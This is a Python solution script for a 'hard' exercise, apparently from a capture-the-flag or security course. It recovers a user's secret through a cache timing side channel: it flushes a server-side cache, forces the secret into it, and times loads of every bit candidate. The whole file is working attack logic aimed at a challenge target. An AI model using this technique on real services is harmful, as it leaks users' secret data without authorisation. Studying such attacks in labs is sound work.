"""
    The solution script for the hard challenge, a server-side cache.
"""
from tqdm import tqdm
from attack_util import *
from itertools import product


class HardAttacker(Attacker):
    """The attacker code for the hard challenge

    Extends the Attacker class, so all attributes there apply.

    Attributes:
        pedantic (bool): if True, enforces that the fastest response and the 
            overall fastest time were both achieved by the same part (restarts).
            Otherwise returns the part with fastest time, Defaults to False.
        reps (int): the number of measurement repetitions to make for each part
            in the attack. Defaults to DEFAULT_MEASURE_COUNT.
    """
    MAX_CACHE_SIZE = 64     # the maximal cache size for this challenge
    DISPLAY_AMOUNT = 10     # amount of top results to show in verbose mode
    DEFAULT_MEASURE_COUNT = 5   # the default amount of timing measurements to make
    
    def __init__(self, pedantic=False, reps=DEFAULT_MEASURE_COUNT, *args, **kwargs):
        self.pedantic = pedantic
        self.reps = reps
        super().__init__(*args, **kwargs)

    @staticmethod
    def _print_measurement_data(measurements):
        candidates = measurements.keys()
        fastest_times = {cand: min(cand_times) for cand, cand_times in measurements.items()}
        accumulated_times = {cand: sum(measurements[cand]) for cand in candidates}

        # printing extra info about results
        sum_sorted_candidates = sorted(candidates, key=lambda cand: accumulated_times[cand])
        fastest_sorted_candidates = sorted(candidates, key=lambda cand: fastest_times[cand])
        print(f"Top {HardAttacker.DISPLAY_AMOUNT} by fastest time were:")
        for cand in fastest_sorted_candidates[:HardAttacker.DISPLAY_AMOUNT]:
            print(f"Candidate: {cand}\t Fastest: {fastest_times[cand]:f} sec.\tMeasurements: {measurements[cand]}")
        print(f"Top {HardAttacker.DISPLAY_AMOUNT} by total time were:")
        for cand in sum_sorted_candidates[:HardAttacker.DISPLAY_AMOUNT]:
            print(f"Candidate: {cand}\t Total: {accumulated_times[cand]:f} sec.\tMeasurements: {measurements[cand]}")
        
    
    def flush_cache_from_part(self, part):
        """Flushes a specific body part type from the cache
        
        This is simply done by filling the cache with a body part of a
        different type.

        Args:
            part (str): the name of the part to flush from the cache
        """
        if part == PART_ORDER[0]:
            flush_part = PART_ORDER[1]
        else:
            flush_part = PART_ORDER[0]

        # load arbitrary, elements of a different part to flush the original away
        part_options = product('01', repeat=PART_TO_BITLEN[flush_part])
        for _, bits in zip(range(self.MAX_CACHE_SIZE), part_options):
            self.load_part_bits_to_cache(flush_part, ''.join(bits))
    
    
    def find_part(self, part):
        candidates = [''.join(bits) for bits in product('01', repeat=PART_TO_BITLEN[part])]
        all_times = {cand: [] for cand in candidates}   # stores time records
        for rep in tqdm(range(self.reps), ascii=True, desc=f"Attacking {part.capitalize()}"):
            if rep == 0 or self.MAX_CACHE_SIZE >= len(candidates):
                # Optimization, no need to flush if old values will be evicted anyways
                self.flush_cache_from_part(part)
            
            for i, cand in enumerate(candidates):
                # ensures the part is always cached
                if i % self.MAX_CACHE_SIZE == 0:
                    self.leak_user_part_to_cache(part)
                
                all_times[cand].append(self.load_part_bits_to_cache(part, cand))

        fastest_times = {cand: min(cand_times) for cand, cand_times in all_times.items()}
        fastest_cand = min(candidates, key=lambda cand: fastest_times[cand])
        
        accumulated_times = {cand: sum(all_times[cand]) for cand in candidates}
        sum_best = min(candidates, key=lambda cand: accumulated_times[cand])

        if self.verbose:
            self._print_measurement_data(all_times)
        
        if self.pedantic and sum_best != fastest_cand:
            print("Indecisive Results, Retrying")
            return self.find_part(part)
        
        return fastest_cand

if __name__ == '__main__':
    print(HardAttacker.attack(verbose=True))